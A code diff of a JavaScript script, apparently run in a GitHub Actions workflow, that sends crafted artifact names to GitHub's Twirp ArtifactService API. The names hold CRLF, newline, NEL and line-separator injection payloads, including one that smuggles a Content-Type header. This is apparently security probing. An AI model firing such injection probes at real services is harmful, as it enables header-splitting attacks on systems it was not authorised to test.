@@ -8,12 +8,13 @@ module.exports = async function scanNames({context}) {
   const base = new URL(resultsUrl).origin;
   const service = 'github.actions.results.api.v1.ArtifactService';
   const names = [
-    ['crlf', 'probe\r\nContent-Type: application/json\u0085.json'],
-    ['lf', 'probe\nContent-Type: application/json\u0085.json'],
-    ['cr', 'probe\rContent-Type: application/json\u0085.json'],
-    ['encoded-crlf', 'probe%0D%0AContent-Type:%20application/json%85.json'],
-    ['nel-break', 'probe\u0085Content-Type: application/json\u0085.json'],
-    ['line-separator', 'probe\u2028Content-Type: application/json\u0085.json'],
+    ['crlf', 'probe\r\nx.json'],
+    ['lf', 'probe\nx.json'],
+    ['cr', 'probe\rx.json'],
+    ['encoded-crlf', 'probe%0D%0Ax.json'],
+    ['nel-break', 'probe\u0085x.json'],
+    ['line-separator', 'probe\u2028x.json'],
+    ['encoded-header', 'probe%0D%0AContent-Type%3A%20application%2Fjson%85.json'],
   ];
   async function twirp(method, body) {
     const response = await fetch(`${base}/twirp/${service}/${method}`, {
